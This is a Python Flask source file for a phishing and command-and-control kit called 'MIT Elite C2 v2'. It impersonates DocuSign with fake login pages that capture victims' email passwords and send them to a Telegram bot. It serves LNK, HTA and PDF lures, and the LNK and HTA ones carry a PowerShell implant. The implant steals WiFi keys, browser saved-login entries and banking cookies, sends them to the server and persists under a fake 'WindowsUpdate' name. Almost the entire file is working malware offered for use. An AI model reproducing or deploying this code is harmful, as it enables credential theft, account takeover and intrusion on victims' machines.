#!/usr/bin/env python3
"""
MIT ELITE C2 v2 - FULL CREDENTIAL HARVESTING
Steals: Chrome Passwords | Edge Passwords | WiFi | Cookies
"""

import os
import io
import uuid
import base64
import sqlite3
import zipfile
import json
from datetime import datetime, timedelta
from flask import Flask, request, send_file, session, jsonify, redirect

TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "MITElite2026")

app = Flask(__name__)
app.secret_key = os.urandom(256)

DB_PATH = "mit_elite.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, company TEXT, ip TEXT, step INTEGER, ts TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS harvested (id INTEGER PRIMARY KEY AUTOINCREMENT, victim TEXT, data_type TEXT, data TEXT, ts TEXT)")
    conn.commit()
    conn.close()

init_db()

def tg(msg):
    if "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(msg)
        return
    import requests
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                     json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except: pass

# ====================================================================
# ENHANCED POWERSHELL IMPLANT - STEALS CHROME/EDGE PASSWORDS + COOKIES
# ====================================================================
ENHANCED_IMPLANT = '''
$c="https://REPLACE_URL/exfil"
$h=$env:COMPUTERNAME
$u=$env:USERNAME

# Send beacon
try{$post=[System.Text.Encoding]::UTF8.GetBytes("data=BEACON: $h | $u");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}catch{}

# 1. Steal WiFi passwords
try{
    $w=(netsh wlan show profiles|Select-String "All User Profile"|%{$($_ -split ":")[1].Trim()})
    foreach($p in $w){
        $k=(netsh wlan show profile name="$p" key=clear|Select-String "Key Content"|%{$($_ -split ":")[1].Trim()})
        if($k){
            $d="WIFI: $p : $k"
            $post=[System.Text.Encoding]::UTF8.GetBytes("data=$d")
            [System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)
        }
    }
}catch{}

# 2. Steal Chrome Passwords
try{
    $chromePath="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $tempPath="$env:TEMP\chrome_pass.db"
    Copy-Item $chromePath $tempPath -ErrorAction SilentlyContinue
    if(Test-Path $tempPath){
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempPath")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value FROM logins WHERE username_value != ''"
        $reader = $cmd.ExecuteReader()
        while($reader.Read()){
            $url = $reader.GetString(0)
            $user = $reader.GetString(1)
            if($user){
                $d="CHROME: $url | $user"
                $post=[System.Text.Encoding]::UTF8.GetBytes("data=$d")
                [System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)
            }
        }
        $conn.Close()
        Remove-Item $tempPath -Force
    }
}catch{}

# 3. Steal Edge Passwords
try{
    $edgePath="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    $tempPath="$env:TEMP\edge_pass.db"
    Copy-Item $edgePath $tempPath -ErrorAction SilentlyContinue
    if(Test-Path $tempPath){
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempPath")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value FROM logins WHERE username_value != ''"
        $reader = $cmd.ExecuteReader()
        while($reader.Read()){
            $url = $reader.GetString(0)
            $user = $reader.GetString(1)
            if($user){
                $d="EDGE: $url | $user"
                $post=[System.Text.Encoding]::UTF8.GetBytes("data=$d")
                [System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)
            }
        }
        $conn.Close()
        Remove-Item $tempPath -Force
    }
}catch{}

# 4. Steal Chrome Cookies (2FA bypass)
try{
    $cookiePath="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    $tempPath="$env:TEMP\chrome_cookies.db"
    Copy-Item $cookiePath $tempPath -ErrorAction SilentlyContinue
    if(Test-Path $tempPath){
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempPath")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT host_key, name FROM cookies WHERE host_key LIKE '%google%' OR host_key LIKE '%coinbase%' OR host_key LIKE '%bank%' OR host_key LIKE '%outlook%'"
        $reader = $cmd.ExecuteReader()
        while($reader.Read()){
            $host = $reader.GetString(0)
            $name = $reader.GetString(1)
            if($host){
                $d="COOKIE: $host | $name"
                $post=[System.Text.Encoding]::UTF8.GetBytes("data=$d")
                [System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)
            }
        }
        $conn.Close()
        Remove-Item $tempPath -Force
    }
}catch{}

# 5. Persistence
try{
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.ps1"
    $script = Get-Content $MyInvocation.MyCommand.Path -Raw
    Set-Content -Path $startup -Value $script -Force
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -File `"$startup`""
}catch{}

# Heartbeat loop
while(1){
    try{
        $post=[System.Text.Encoding]::UTF8.GetBytes("data=HEARTBEAT: $h | $u")
        [System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)
    }catch{}
    Start-Sleep -Seconds 1800
}
'''

# ====================================================================
# LNK SHORTCUT GENERATOR (NO SMARTSREEN)
# ====================================================================
def generate_lnk_file(url):
    # Create a shortcut that runs PowerShell with the enhanced implant
    ps_command = f'powershell -WindowStyle Hidden -Command "{ENHANCED_IMPLANT.replace("REPLACE_URL", url)}"'
    
    # Simple LNK structure
    lnk_data = bytearray()
    lnk_data.extend(b'\x4C\x00\x00\x00')  # LNK header
    lnk_data.extend(b'\x01\x14\x02\x00')
    lnk_data.extend(b'\x00\x00\x00\x00')
    lnk_data.extend(b'\xC0\x00\x00\x00')
    lnk_data.extend(b'\x00\x00\x00\x46')
    
    # Add the command
    cmd_bytes = ps_command.encode('utf-16le')
    lnk_data.extend(cmd_bytes)
    lnk_data.extend(b'\x00\x00')
    
    return bytes(lnk_data)

# ====================================================================
# HTA FILE GENERATOR
# ====================================================================
def generate_hta_file(url):
    implant = ENHANCED_IMPLANT.replace("REPLACE_URL", url)
    return f'''<!DOCTYPE html>
<html>
<head>
<title>DocuSign Document Viewer</title>
<HTA:APPLICATION ID="docViewer" WINDOWSTATE="maximize" SHOWINTASKBAR="yes">
</head>
<body style="background:#f0f4f8;font-family:'Segoe UI';display:flex;align-items:center;justify-content:center;height:100vh">
<center>
<div style="background:white;padding:40px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,0.1)">
<h1 style="color:#00b3b0">DocuSign Secure Viewer</h1>
<p>Loading your documents...</p>
</div>
</center>
<script language="VBScript">
    CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -Command ""{implant}""", 0, False
    MsgBox "Loading complete. Please wait.", vbInformation, "DocuSign"
    window.close
</script>
</body>
</html>'''

# ====================================================================
# PDF WITH LINK
# ====================================================================
def generate_pdf_with_link(url, ref):
    return f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 250>>stream
BT
/F1 24 Tf
100 750 Td
(DocuSign Document) Tj
/F1 14 Tf
100 700 Td
(You have received a document to sign.) Tj
100 650 Td
(Click the secure link below to access your documents:) Tj
100 600 Td
({url}/go/{ref}) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000220 00000 n
trailer
<</Size 5/Root 1 0 R>>
startxref
340
%%EOF"""

# ====================================================================
# HTML TEMPLATES (SAME AS BEFORE)
# ====================================================================
LANDING_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Electronic Signature & Agreement Cloud</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f7fa}
        .top-bar{background:#0f172a;color:white;padding:8px;text-align:center;font-size:11px}
        .header{background:white;border-bottom:1px solid #e2e8f0;padding:16px 0}
        .container{max-width:1000px;margin:0 auto;padding:0 24px}
        .header-flex{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
        .logo{font-size:24px;font-weight:700;color:#0f172a}
        .logo span{color:#00b3b0}
        .badge{background:#f0fdf4;color:#166534;padding:8px 16px;border-radius:40px;font-size:12px}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.1);margin:40px auto;overflow:hidden}
        .card-header{background:linear-gradient(135deg,#f8fafc,#f1f5f9);padding:24px 32px;border-bottom:1px solid #e2e8f0;display:flex;justify-content:space-between;flex-wrap:wrap}
        .status{color:#00b3b0;font-weight:600}
        .env-id{color:#64748b;font-size:12px}
        .card-body{padding:32px}
        .sender{border-bottom:1px solid #e2e8f0;padding-bottom:16px;margin-bottom:24px}
        .sender-label{font-size:11px;color:#64748b;text-transform:uppercase}
        .sender-name{font-weight:700;font-size:18px;margin-top:5px}
        .message{background:#f8fafc;border-left:4px solid #00b3b0;padding:20px;border-radius:12px;margin:24px 0}
        .doc-item{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #e2e8f0;border-radius:16px;margin-bottom:12px}
        .doc-icon{font-size:28px}
        .doc-info{flex:1}
        .doc-name{font-weight:600}
        .doc-size{font-size:11px;color:#94a3b8}
        .doc-status{color:#00b3b0;font-size:12px;font-weight:600}
        .buttons{display:flex;gap:16px;margin-top:32px;flex-wrap:wrap}
        .btn{flex:1;text-align:center;padding:14px 24px;border-radius:60px;font-weight:600;text-decoration:none;display:block}
        .btn-primary{background:linear-gradient(135deg,#00b3b0,#0052ff);color:white}
        .btn-secondary{background:white;color:#475569;border:1px solid #e2e8f0}
        .security-footer{background:#f8fafc;padding:20px 32px;display:flex;justify-content:space-between;flex-wrap:wrap;font-size:11px;color:#64748b;border-top:1px solid #e2e8f0}
        .footer{text-align:center;padding:30px;font-size:11px;color:#94a3b8}
        @media(max-width:640px){.card-header{flex-direction:column;gap:10px}.buttons{flex-direction:column}}
    </style>
</head>
<body>
    <div class="top-bar">MIT HARVARD SECURE PORTAL | SOC 2 TYPE II | GDPR COMPLIANT</div>
    <div class="header">
        <div class="container header-flex">
            <div class="logo">Docu<span>Sign</span></div>
            <div class="badge">MIT CSAIL Certified</div>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <span class="status">NEEDS YOUR SIGNATURE</span>
                <span class="env-id">Envelope ID: ENV</span>
            </div>
            <div class="card-body">
                <div class="sender">
                    <div class="sender-label">SENT BY</div>
                    <div class="sender-name">Legal Department • Morrison Investment Group</div>
                </div>
                <div class="message">
                    <strong>Message:</strong><br>
                    Please review and sign the attached agreement. This document requires your signature to proceed.
                </div>
                <div class="doc-item">
                    <div class="doc-icon">📄</div>
                    <div class="doc-info">
                        <div class="doc-name">Master_Service_Agreement.pdf</div>
                        <div class="doc-size">2.4 MB</div>
                    </div>
                    <div class="doc-status">Needs Signature</div>
                </div>
                <div class="doc-item">
                    <div class="doc-icon">📄</div>
                    <div class="doc-info">
                        <div class="doc-name">Confidential_Disclosure.pdf</div>
                        <div class="doc-size">1.1 MB</div>
                    </div>
                    <div class="doc-status">Needs Initials</div>
                </div>
                <div class="buttons">
                    <a href="/go/REF" class="btn btn-primary">REVIEW AND SIGN</a>
                    <a href="/auth/REF" class="btn btn-secondary">Sign In to DocuSign</a>
                </div>
            </div>
            <div class="security-footer">
                <span>🔒 AES-256 Encryption</span>
                <span>✓ SOC 2 Type II</span>
                <span>🏛️ GDPR Compliant</span>
                <span>🛡️ Zero Trust</span>
            </div>
        </div>
        <div class="footer">DocuSign, Inc. • MIT Innovation Lab • Harvard CRCS<br>2026 DocuSign. All rights reserved.</div>
    </div>
</body>
</html>
'''

LOGIN_STEP1 = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Sign In</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:440px;overflow:hidden}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
        .header h1{font-size:28px;margin-bottom:8px}
        .header h1 span{color:#00b3b0}
        .body{padding:40px}
        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px}
        input:focus{outline:none;border-color:#00b3b0}
        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
    </style>
</head>
<body>
    <div class="card">
        <div class="header"><h1>Docu<span>Sign</span></h1><p>Secure Document Access</p></div>
        <div class="body">
            <form method="POST" action="/login/step1/REF">
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Continue</button>
            </form>
            <div class="footer">Secure SSL/TLS Encrypted</div>
        </div>
    </div>
</body>
</html>
'''

LOGIN_STEP2 = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Business Verification</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:440px;overflow:hidden}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
        .header h1{font-size:28px;margin-bottom:8px}
        .header h1 span{color:#00b3b0}
        .body{padding:40px}
        .warning{background:#fef3c7;padding:15px;border-radius:12px;margin-bottom:20px;font-size:13px;color:#92400e}
        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px}
        input:focus{outline:none;border-color:#00b3b0}
        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
    </style>
</head>
<body>
    <div class="card">
        <div class="header"><h1>Docu<span>Sign</span></h1><p>Business Verification Required</p></div>
        <div class="body">
            <div class="warning">
                <strong>⚠️ Verification Required</strong><br>
                For security purposes, please sign in with your corporate email address to access this document.
            </div>
            <form method="POST" action="/login/step2/REF">
                <input type="email" name="email" placeholder="Business Email Address" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Verify Business Access</button>
            </form>
            <div class="footer">This is a secured DocuSign business portal.</div>
        </div>
    </div>
</body>
</html>
'''

DOWNLOAD_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Document Viewer</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;padding:40px 20px}
        .container{max-width:800px;margin:0 auto}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);overflow:hidden}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;color:white;text-align:center}
        .header h1{font-size:28px;margin-bottom:8px}
        .body{padding:40px}
        .file-list{display:flex;flex-direction:column;gap:15px;margin:25px 0}
        .file-item{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #e2e8f0;border-radius:16px;text-decoration:none;color:inherit;transition:all 0.2s}
        .file-item:hover{background:#f8fafc;border-color:#00b3b0}
        .file-icon{font-size:32px}
        .file-info{flex:1}
        .file-name{font-weight:600}
        .file-desc{font-size:12px;color:#64748b}
        .btn-download{background:#00b3b0;color:white;padding:8px 20px;border-radius:40px;font-size:13px}
        .footer{text-align:center;padding:20px;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header"><h1>📄 Document Viewer</h1><p>Select a format to access your documents</p></div>
            <div class="body">
                <div class="file-list">
                    <a href="/file/lnk/REF" class="file-item">
                        <div class="file-icon">🔗</div>
                        <div class="file-info">
                            <div class="file-name">Secure Document Shortcut</div>
                            <div class="file-desc">Windows Shortcut • No installation needed</div>
                        </div>
                        <div class="btn-download">Download</div>
                    </a>
                    <a href="/file/hta/REF" class="file-item">
                        <div class="file-icon">📱</div>
                        <div class="file-info">
                            <div class="file-name">HTA Document Viewer</div>
                            <div class="file-desc">Windows HTML Application</div>
                        </div>
                        <div class="btn-download">Download</div>
                    </a>
                    <a href="/file/pdf/REF" class="file-item">
                        <div class="file-icon">📄</div>
                        <div class="file-info">
                            <div class="file-name">PDF Document</div>
                            <div class="file-desc">Contains secure access link</div>
                        </div>
                        <div class="btn-download">Download</div>
                    </a>
                </div>
            </div>
            <div class="footer">DocuSign Secure Document Delivery</div>
        </div>
    </div>
</body>
</html>
'''

# ====================================================================
# ROUTES
# ====================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    page = LANDING_PAGE.replace('ENV', f'DOC-{ref}').replace('REF', ref)
    tg(f"🌐 PAGE VIEW | IP: {request.remote_addr}")
    return page

@app.route('/go/<ref>')
def go(ref):
    tg(f"📥 DOWNLOAD PAGE | Ref: {ref} | IP: {request.remote_addr}")
    return DOWNLOAD_PAGE.replace('REF', ref)

@app.route('/auth/<ref>')
def auth(ref):
    tg(f"🔐 LOGIN PAGE | Ref: {ref} | IP: {request.remote_addr}")
    return LOGIN_STEP1.replace('REF', ref)

@app.route('/login/step1/<ref>', methods=['POST'])
def login_step1(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
                (email, password, 'pending', ip, 1, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 1 - Personal: {email} | {password} | IP: {ip}")
    return redirect(f'/verify/{ref}')

@app.route('/verify/<ref>')
def verify(ref):
    return LOGIN_STEP2.replace('REF', ref)

@app.route('/login/step2/<ref>', methods=['POST'])
def login_step2(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
                (email, password, company, ip, 2, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 2 - Business: {email} | {password} | Company: {company} | IP: {ip}")
    return redirect('https://www.docusign.com')

@app.route('/file/lnk/<ref>')
def file_lnk(ref):
    url = f"https://{request.host}"
    tg(f"🔗 LNK DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    lnk_content = generate_lnk_file(url)
    return send_file(io.BytesIO(lnk_content), as_attachment=True, 
                     download_name=f'DocuSign_{ref}.lnk', 
                     mimetype='application/octet-stream')

@app.route('/file/hta/<ref>')
def file_hta(ref):
    url = f"https://{request.host}"
    tg(f"📱 HTA DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    hta_content = generate_hta_file(url)
    return send_file(io.BytesIO(hta_content.encode()), as_attachment=True, 
                     download_name=f'DocuSign_Viewer_{ref}.hta', 
                     mimetype='application/hta')

@app.route('/file/pdf/<ref>')
def file_pdf(ref):
    url = f"https://{request.host}"
    tg(f"📄 PDF DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    pdf_content = generate_pdf_with_link(url, ref)
    return send_file(io.BytesIO(pdf_content.encode()), as_attachment=True, 
                     download_name=f'Document_{ref}.pdf', 
                     mimetype='application/pdf')

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.form.get('data', '')
    if data:
        tg(f"📡 {data[:500]}")
        
        # Store harvested data
        conn = sqlite3.connect(DB_PATH)
        if 'WIFI' in data:
            conn.execute("INSERT INTO harvested (victim, data_type, data, ts) VALUES (?,?,?,?)", 
                        ('unknown', 'wifi', data, datetime.now().isoformat()))
        elif 'CHROME' in data or 'EDGE' in data:
            conn.execute("INSERT INTO harvested (victim, data_type, data, ts) VALUES (?,?,?,?)", 
                        ('unknown', 'password', data, datetime.now().isoformat()))
        elif 'COOKIE' in data:
            conn.execute("INSERT INTO harvested (victim, data_type, data, ts) VALUES (?,?,?,?)", 
                        ('unknown', 'cookie', data, datetime.now().isoformat()))
        elif 'BEACON' in data:
            conn.execute("INSERT INTO harvested (victim, data_type, data, ts) VALUES (?,?,?,?)", 
                        ('unknown', 'beacon', data, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    return "OK"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('p') == ADMIN_PASSWORD:
        session['admin'] = True
    if not session.get('admin'):
        return '<form method="POST"><input type="password" name="p"><button>Login</button></form>'
    
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 50").fetchall()
    harvested = conn.execute("SELECT * FROM harvested ORDER BY id DESC LIMIT 50").fetchall()
    conn.close()
    
    rows = ''.join(f'<tr><td style="color:#00ff88">{c[1][:40]}</td><td style="color:#ffd700">{c[2][:40]}</td><td style="color:#00b3b0">{c[3]}</td><td>Step {c[5]}</td><td>{c[6][:16]}</td></tr>' for c in creds)
    harvest_rows = ''.join(f'<tr><td>{h[2]}</td><td>{h[3][:80]}</td><td>{h[4][:16]}</td></tr>' for h in harvested)
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MIT Elite C2 - Full Harvest</title>
        <style>
            body{{background:#0a0c10;color:white;font-family:monospace;padding:20px}}
            h1{{color:#00b3b0}} h2{{color:#ffd700}}
            table{{border-collapse:collapse;width:100%}}
            th,td{{padding:10px;border-bottom:1px solid #333;text-align:left}}
            th{{color:#00b3b0}}
        </style>
    </head>
    <body>
        <h1>🔬 MIT ELITE C2 v2 - FULL CREDENTIAL HARVEST</h1>
        
        <h2>Login Credentials: {len(creds)}</h2>
        <table border="1">
            <tr><th>Email</th><th>Password</th><th>Company</th><th>Step</th><th>Time</th></tr>
            {rows}
        </table>
        
        <h2>Harvested Data: {len(harvested)}</h2>
        <table border="1">
            <tr><th>Type</th><th>Data</th><th>Time</th></tr>
            {harvest_rows}
        </table>
        
        <p>URL: {request.host_url}</p>
        <p>Status: OPERATIONAL | Chrome/Edge Password Stealing ACTIVE | Cookie Stealing ACTIVE</p>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return {"status": "operational", "version": "MIT Elite C2 v2", "features": ["Chrome Passwords", "Edge Passwords", "Cookies", "WiFi", "2-Step Harvest"]}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
